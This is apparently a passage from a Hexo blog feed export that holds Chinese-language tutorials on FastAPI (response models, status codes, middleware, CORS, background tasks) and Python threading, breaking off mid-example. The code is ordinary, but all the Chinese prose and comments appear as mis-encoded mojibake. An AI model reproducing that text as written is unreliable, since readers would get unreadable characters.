UserIn</span>):</span><br><span class="line">    <span class="keyword">return</span> user</span><br></pre></td></tr></table></figure>

<h3 id="è®¾ç½®å“åº”ä¸åŒ…å«é»˜è®¤å€¼"><a href="#è®¾ç½®å“åº”ä¸åŒ…å«é»˜è®¤å€¼" class="headerlink" title="è®¾ç½®å“åº”ä¸åŒ…å«é»˜è®¤å€¼"></a>è®¾ç½®å“åº”ä¸åŒ…å«é»˜è®¤å€¼</h3><p><code>@app</code>è®¾ç½®<code>response_model_exclude_unset</code>å‚æ•°ä¸º<code>True</code>, ä¸æƒ³è·å–è¿‡å¤šJsonå¯ä»¥ç”¨çš„ä¸Š.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    price: <span class="built_in">float</span></span><br><span class="line">    tax: <span class="built_in">float</span> = <span class="number">10.5</span></span><br><span class="line">    tags: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line"></span><br><span class="line">items = &#123;</span><br><span class="line">    <span class="string">&quot;foo&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">50.2</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span>, response_model=Item, response_model_exclude_unset=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_item</span>(<span class="params">item_id: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> items[item_id]</span><br></pre></td></tr></table></figure>

<p>å“åº”ä¸º</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">50.2</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è€Œä¸æ˜¯</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">50.2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tax&quot;</span><span class="punctuation">:</span> <span class="number">10.5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="è®¾ç½®å“åº”çŠ¶æ€ç "><a href="#è®¾ç½®å“åº”çŠ¶æ€ç " class="headerlink" title="è®¾ç½®å“åº”çŠ¶æ€ç "></a>è®¾ç½®å“åº”çŠ¶æ€ç </h2><p><code>@app</code>è®¾ç½®å‚æ•°<code>status_code</code>, å“åº”æ—¶ä¼šè¿”å›å¯¹åº”çŠ¶æ€ç , ä¸æƒ³æš´éœ²çœŸå®çŠ¶æ€ç æ—¶ä¼šå¾ˆæœ‰ç”¨.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, status</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨statusè‡ªå¸¦çš„å˜é‡æ˜ å°„,æˆ–è€…ç›´æ¥ä½¿ç”¨æ•°å­—</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&quot;</span>, status_code=status.HTTP_201_CREATED</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_item</span>(<span class="params">name: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;name&quot;</span>: name&#125;</span><br></pre></td></tr></table></figure>





<hr>
<blockquote>
<p>PS: åˆ°è¿™é‡Œ, ç®€å•çš„APIåº”ç”¨å°±æ²¡é—®é¢˜äº†, æ¥ä¸‹æ¥æ˜¯ä¸€äº›è¿›é˜¶æŠ€å·§</p>
</blockquote>
<h2 id="ä¸­é—´ä»¶"><a href="#ä¸­é—´ä»¶" class="headerlink" title="ä¸­é—´ä»¶"></a>ä¸­é—´ä»¶</h2><blockquote>
<p>&quot;ä¸­é—´ä»¶&quot;æ˜¯ä¸€ä¸ªå‡½æ•°,å®ƒåœ¨æ¯ä¸ª<strong>è¯·æ±‚</strong>è¢«ç‰¹å®šçš„<em>è·¯å¾„æ“ä½œ</em>å¤„ç†ä¹‹å‰,ä»¥åŠåœ¨æ¯ä¸ª<strong>å“åº”</strong>è¿”å›ä¹‹å‰å·¥ä½œ.</p>
</blockquote>
<p>ä½¿ç”¨è£…é¥°å™¨ <code>@app.middleware(&quot;http&quot;)</code>æ¥æ·»åŠ ä¸­é—´ä»¶</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°: request</li>
<li>ç¬¬äºŒä¸ªå‚æ•°: ä¸€ä¸ªå‡½æ•° <code>call_next</code> (å‡½æ•°åå¯è‡ªå®šä¹‰)<ul>
<li>å®ƒå°†æ¥æ”¶ <code>request</code> ä½œä¸ºå‚æ•°</li>
<li>å°† <code>request</code> ä¼ é€’ç»™ç›¸åº”çš„ è·¯å¾„æ“ä½œ</li>
<li>ç„¶åå®ƒå°†è¿”å›ç”±ç›¸åº”çš„ è·¯å¾„æ“ä½œ ç”Ÿæˆçš„ <code>response</code>.</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;num&quot;</span>: num&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">add_process_time_header</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    process_time = time.time() - start_time</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ·»åŠ å›è°ƒæ—¶é—´</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Process-Time&quot;</span>] = <span class="built_in">str</span>(process_time)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">set_status_code_eq_200</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;set code eq 200&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    </span><br><span class="line">	<span class="comment"># ä¿®æ”¹æ‰€æœ‰å“åº”çŠ¶æ€ç ä¸€ç›´ä¸º200</span></span><br><span class="line">    response.status_code = <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è°ƒè¯•æ¨¡å¼æµ‹è¯•ä¸€ä¸‹, é¡ºä¾¿è§‚å¯Ÿä¸‹ä¸­é—´ä»¶çš„æ‰§è¡Œé¡ºåº</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLz9udW09MjI=">http://127.0.0.1:8000/?num=22</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLz9udW09c3Ry">http://127.0.0.1:8000/?num=str</span></li>
</ul>
<p>æ‰§è¡Œé¡ºåºæ˜¯ä»ä¸‹å¾€ä¸Šå…ˆæ‰§è¡Œ<code>call_next</code>å‰çš„ä»£ç ,ç„¶åæ‰§è¡Œ<code>call_next</code>å, å†ä»ä¸Šå¾€ä¸‹æ‰§è¡Œ<code>call_next</code>åçš„éƒ¨åˆ†, å¯ä»¥çœ‹æˆæ ˆçš„æ“ä½œé¡ºåº, å…ˆå…¥åå‡º, åå…¥å…ˆå‡º.</p>
<h3 id="è·¨åŸŸèµ„æºå…±äº«"><a href="#è·¨åŸŸèµ„æºå…±äº«" class="headerlink" title="è·¨åŸŸèµ„æºå…±äº«"></a>è·¨åŸŸèµ„æºå…±äº«</h3><blockquote>
<p>æŒ‡æµè§ˆå™¨ä¸­è¿è¡Œçš„å‰ç«¯æ‹¥æœ‰ä¸åç«¯é€šä¿¡çš„ JavaScript ä»£ç ï¼Œè€Œåç«¯å¤„äºä¸å‰ç«¯ä¸åŒçš„ã€Œæºã€çš„æƒ…å†µ.</p>
</blockquote>
<p>æºæ˜¯åè®®ï¼ˆ<code>http</code>ï¼Œ<code>https</code>ï¼‰ã€åŸŸï¼ˆ<code>myapp.com</code>ï¼Œ<code>localhost</code>ï¼Œ<code>localhost.tiangolo.com</code>ï¼‰ä»¥åŠç«¯å£ï¼ˆ<code>80</code>ã€<code>443</code>ã€<code>8080</code>ï¼‰çš„ç»„åˆã€‚</p>
<p>å› æ­¤ï¼Œè¿™äº›éƒ½æ˜¯ä¸åŒçš„æºï¼š</p>
<ul>
<li><code>http://localhost</code></li>
<li><code>https://localhost</code></li>
<li><code>http://localhost:8080</code></li>
</ul>
<p>å³ä½¿å®ƒä»¬éƒ½åœ¨ <code>localhost</code> ä¸­ï¼Œä½†æ˜¯å®ƒä»¬ä½¿ç”¨ä¸åŒçš„åè®®æˆ–è€…ç«¯å£ï¼Œæ‰€ä»¥å®ƒä»¬éƒ½æ˜¯ä¸åŒçš„ã€Œæºã€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="comment"># å¯¼å…¥ CORSMiddleware</span></span><br><span class="line"><span class="keyword">from</span> fastapi.middleware.cors <span class="keyword">import</span> CORSMiddleware</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªå…è®¸çš„æºåˆ—è¡¨ï¼ˆç”±å­—ç¬¦ä¸²ç»„æˆï¼‰</span></span><br><span class="line">origins = [</span><br><span class="line">    <span class="string">&quot;http://localhost.tiangolo.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://localhost.tiangolo.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å…¶ä½œä¸ºã€Œä¸­é—´ä»¶ã€æ·»åŠ åˆ°ä½ çš„ FastAPI åº”ç”¨ä¸­</span></span><br><span class="line">app.add_middleware(</span><br><span class="line">    CORSMiddleware,</span><br><span class="line">    allow_origins=origins,</span><br><span class="line">    allow_credentials=<span class="literal">True</span>,	<span class="comment"># å…è®¸å‡­è¯ï¼ˆæˆæƒ headersï¼ŒCookies ç­‰ï¼‰</span></span><br><span class="line">    allow_methods=[<span class="string">&quot;*&quot;</span>],  <span class="comment"># ç‰¹å®šçš„ HTTP æ–¹æ³•ï¼ˆPOSTï¼ŒPUTï¼‰æˆ–è€…ä½¿ç”¨é€šé…ç¬¦ &quot;*&quot; å…è®¸æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    allow_headers=[<span class="string">&quot;*&quot;</span>],  <span class="comment"># ç‰¹å®šçš„ HTTP headers æˆ–è€…ä½¿ç”¨é€šé…ç¬¦ &quot;*&quot; å…è®¸æ‰€æœ‰ headersã€‚</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å…¶å®ƒåº”ç”¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC9hZHZhbmNlZC9taWRkbGV3YXJlLw==">ğŸšª</span></p>
</blockquote>
<h2 id="åˆ›å»ºåå°ä»»åŠ¡"><a href="#åˆ›å»ºåå°ä»»åŠ¡" class="headerlink" title="åˆ›å»ºåå°ä»»åŠ¡"></a>åˆ›å»ºåå°ä»»åŠ¡</h2><blockquote>
<p>ä½¿ç”¨åœºæ™¯: é‚®ä»¶å‘é€, å›¾ç‰‡æ¸²æŸ“ä¸‹è½½...</p>
</blockquote>
<p>ä½¿ç”¨<code>BackgroundTasks</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> BackgroundTasks, FastAPI</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_notification</span>(<span class="params">email: <span class="built_in">str</span>, message=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;log.txt&quot;</span>, mode=<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> email_file:</span><br><span class="line">        content = <span class="string">f&quot;notification for <span class="subst">&#123;email&#125;</span>: <span class="subst">&#123;message&#125;</span>&quot;</span></span><br><span class="line">        email_file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/send-notification/&#123;email&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_notification</span>(<span class="params">email: <span class="built_in">str</span>, background_tasks: BackgroundTasks</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å…ˆæ–¹æ³•ååä¼ å‚</span></span><br><span class="line">    background_tasks.add_task(write_notification, email, message=<span class="string">&quot;some notification&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Notification sent in the background&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å…¶å®ƒåŠŸèƒ½"><a href="#å…¶å®ƒåŠŸèƒ½" class="headerlink" title="å…¶å®ƒåŠŸèƒ½"></a>å…¶å®ƒåŠŸèƒ½</h2><blockquote>
<p>ä»¥ä¸‹éƒ¨åˆ†å±äºæ¯”è¾ƒå°‘ç”¨åˆ°æˆ–è€…æ˜¯çŸ¥è¯†é‡è¾ƒå¤šéœ€è¦æ·±å…¥å­¦ä¹ çš„, æ•…åªæä¾›å®˜æ–¹é“¾æ¥ä»¥ä¾›å‚è€ƒ</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9leHRyYS1kYXRhLXR5cGVzLw==">ä½¿ç”¨å…¶å®ƒæ•°æ®ç±»å‹</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9yZXF1ZXN0LWZpbGVzLw==">è®¾ç½®è¯·æ±‚æ–‡ä»¶</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9oYW5kbGluZy1lcnJvcnMv">é”™è¯¯å¼‚å¸¸å¤„ç†</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9ib2R5LXVwZGF0ZXMv">è¯·æ±‚ä½“æ›´æ–°æ•°æ®</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9zcWwtZGF0YWJhc2VzLw==">ä½¿ç”¨å…³ç³»æ•°æ®åº“</span></li>
</ul>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>FastAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>Python çº¿ç¨‹è¿›ç¨‹ç›¸å…³åº“çš„ç®€å•åº”ç”¨</title>
    <url>/f89f9ea4/</url>
    <content><![CDATA[<h2 id="ğŸ‡ç®€å•äº†è§£"><a href="#ğŸ‡ç®€å•äº†è§£" class="headerlink" title="ğŸ‡ç®€å•äº†è§£"></a>ğŸ‡ç®€å•äº†è§£</h2><h3 id="çº¿ç¨‹å’Œè¿›ç¨‹"><a href="#çº¿ç¨‹å’Œè¿›ç¨‹" class="headerlink" title="çº¿ç¨‹å’Œè¿›ç¨‹"></a>çº¿ç¨‹å’Œè¿›ç¨‹</h3><ul>
<li>æ¯ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸åŒè¿›ç¨‹ä¹‹é—´ä¸å…±äº«å†…å­˜</li>
<li>ä¸€ä¸ªè¿›ç¨‹åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹å…±äº«ç€åŒä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜</li>
<li>åœ¨æ“ä½œç³»ç»Ÿä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªè¿›ç¨‹å´©æºƒä¸ä¼šå¯¹å…¶ä»–è¿›ç¨‹äº§ç”Ÿå½±å“ï¼Œè€Œçº¿ç¨‹æ²¡æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œä½†å®ƒæœ‰è‡ªå·±çš„å †æ ˆå’Œå±€éƒ¨å˜é‡</li>
<li>çº¿ç¨‹å¯ä»¥é€šè¿‡å…±äº«å˜é‡çš„æ–¹å¼å®ç°å¤šçº¿ç¨‹ç›´æ¥çš„é€šä¿¡ï¼Œè€Œè¿›ç¨‹çš„é€šä¿¡ä¸»è¦é€šè¿‡æ¶ˆæ¯ä¼ é€’ã€‚ç›¸å¯¹å…±äº«å˜é‡è€Œè¨€ï¼Œæ¶ˆæ¯ä¼ é€’ä¼šæ¶ˆè€—æ›´å¤šèµ„æº</li>
</ul>
<h3 id="åŒæ­¥å’Œå¼‚æ­¥"><a href="#åŒæ­¥å’Œå¼‚æ­¥" class="headerlink" title="åŒæ­¥å’Œå¼‚æ­¥"></a>åŒæ­¥å’Œå¼‚æ­¥</h3><ul>
<li>åŒæ­¥æ˜¯æŒ‡ä¸åŒçš„ç¨‹åºå•å…ƒä¸ºäº†å®ŒæˆæŸä¸ªä»»åŠ¡é€šè¿‡æŸç§é€šä¿¡æ–¹å¼åè°ƒä¸€è‡´ï¼Œæ„å‘³ç€æœ‰åº</li>
<li>å¼‚æ­¥æŒ‡ä¸åŒç¨‹åºå•å…ƒä¹‹é—´ä¸éœ€è¦åè°ƒä¹Ÿå¯å•ç‹¬å®Œæˆä»»åŠ¡</li>
</ul>
<h3 id="å¹¶å‘å’Œå¹¶è¡Œ"><a href="#å¹¶å‘å’Œå¹¶è¡Œ" class="headerlink" title="å¹¶å‘å’Œå¹¶è¡Œ"></a>å¹¶å‘å’Œå¹¶è¡Œ</h3><blockquote>
<p>æ¥è‡ª Erlangä¹‹çˆ¶ Joe Armstrong çš„è§£é‡Š</p>
<p>å¹¶å‘ï¼šä¸¤ä¸ªé˜Ÿåˆ—å’Œä¸€å°å’–å•¡æœº<br>å¹¶è¡Œï¼šä¸¤ä¸ªé˜Ÿåˆ—å’Œä¸¤å°å’–å•¡æœº</p>
</blockquote>
<p><img data-src="http://img.owq.world/2021/11/2134-81fe70.png"></p>
<ul>
<li>å¹¶å‘è¡¨ç¤º<strong>å¤šä¸ªç¨‹åºå¯ä»¥åœ¨åŒä¸€ä¸ªæ—¶é—´æ®µå†…è¢«æ‰§è¡Œ</strong></li>
<li>å¹¶è¡Œè¡¨ç¤ºå¤šä¸ªç¨‹åºå¯ä»¥åœ¨<strong>åŒä¸€æ—¶åˆ»</strong>è¢«è¿è¡Œ</li>
</ul>
<hr>
<h2 id="Threadingåº“"><a href="#Threadingåº“" class="headerlink" title="Threadingåº“"></a>Threadingåº“</h2><blockquote>
<p>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3RocmVhZGluZy5odG1s">https://docs.python.org/zh-cn/3/library/threading.html</span></p>
</blockquote>
<h3 id="ç®€å•åº”ç”¨"><a href="#ç®€å•åº”ç”¨" class="headerlink" title="ç®€å•åº”ç”¨"></a>ç®€å•åº”ç”¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">n</span>): <span class="comment"># éœ€è¦è¢«çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line">    time.sleep(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># å®ä¾‹åŒ–çº¿ç¨‹</span></span><br><span class="line">    t = Thread(target=wait, args=[<span class="number">10</span>])</span><br><span class="line">    t.start()	<span class="comment"># å¯åŠ¨çº¿ç¨‹, çº¿ç¨‹å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">    t.join()	<span class="comment"># ä¼šå°†ä¸»çº¿ç¨‹æŒ‚èµ·ï¼Œç›´åˆ°å­çº¿ç¨‹è¿è¡Œç»“æŸ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="å¼€å‘åº”ç”¨"><a href="#å¼€å‘åº”ç”¨" class="headerlink" title="å¼€å‘åº”ç”¨"></a>å¼€å‘åº”ç”¨</h3><p>ä½¿ç”¨ç»§æ‰¿æ–¹å¼åˆ›å»ºçº¿ç¨‹ï¼Œå¯ä»¥åšä¸€äº›é¢å¤–çš„é€»è¾‘å¤„ç†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, args, tname=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="comment"># è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.tname = tname</span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="comment"># çº¿ç¨‹æ‰§è¡Œçš„å…·ä½“é€»è¾‘</span></span><br><span class="line">        self.func(*self.args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">n</span>):</span><br><span class="line">    time.sleep(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># å®ä¾‹åŒ–çº¿ç¨‹</span></span><br><span class="line">    t = MyThread(wait, (<span class="number">10</span>,), wait.__name__)</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="çº¿ç¨‹é€šä¿¡"><a href="#çº¿ç¨‹é€šä¿¡" class="headerlink" title="çº¿ç¨‹é€šä¿¡"></a>çº¿ç¨‹é€šä¿¡</h3><blockquote>
<p>çº¿ç¨‹é—´é€šä¿¡å¼ºè°ƒçš„æ˜¯çº¿ç¨‹ä¹‹é—´ä¼ é€’å¯¹è±¡å¼•ç”¨</p>
</blockquote>
<p>Pythonä¸­æœ‰GILé”ï¼Œæ˜¯ä¸æ˜¯ä»£è¡¨çº¿ç¨‹ä¸­çš„å…±äº«å˜é‡å°±ä¸€å®šæ˜¯å®‰å…¨çš„ï¼Ÿå…ˆçœ‹ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">ZERO = <span class="number">0</span>	<span class="comment"># å…±äº«å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># å¤šæ¬¡æ“ä½œ</span></span><br><span class="line">        ZERO += <span class="number">1</span></span><br><span class="line">        ZERO -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line">    [t.join() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ZERO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåä¼šå‘ç°ï¼Œæ¯æ¬¡<code>ZERO</code>çš„ç»“æœéƒ½ä¸ä¸€æ ·ï¼Œè¿™æ˜¯æ¯ä¸ªçº¿ç¨‹æ‹¿åˆ°GILå¹¶ä¸ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ï¼Œæ•´ä¸ªç¨‹åºæ˜¯å¼‚æ­¥å¹¶å‘çš„ï¼Œæ‰€ä»¥å‡½æ•°å†…å¯¹<code>ZERO</code>çš„æ“ä½œå¹¶ä¸æ˜¯åŸå­æ€§ã€‚</p>
<p>è§£å†³æ–¹æ³•ï¼šåŠ äº’æ–¥é”ï¼Œå°†é‡è¦æŒ‡ä»¤åŒ…è£…æˆåŸå­æ“ä½œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread</span><br><span class="line"></span><br><span class="line">ZERO = <span class="number">0</span>	<span class="comment"># å…±äº«å˜é‡</span></span><br><span class="line">LOCK = Lock()	<span class="comment"># åˆ›å»ºlockå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># å¤šæ¬¡æ“ä½œ</span></span><br><span class="line">        LOCK.acquire() <span class="comment"># 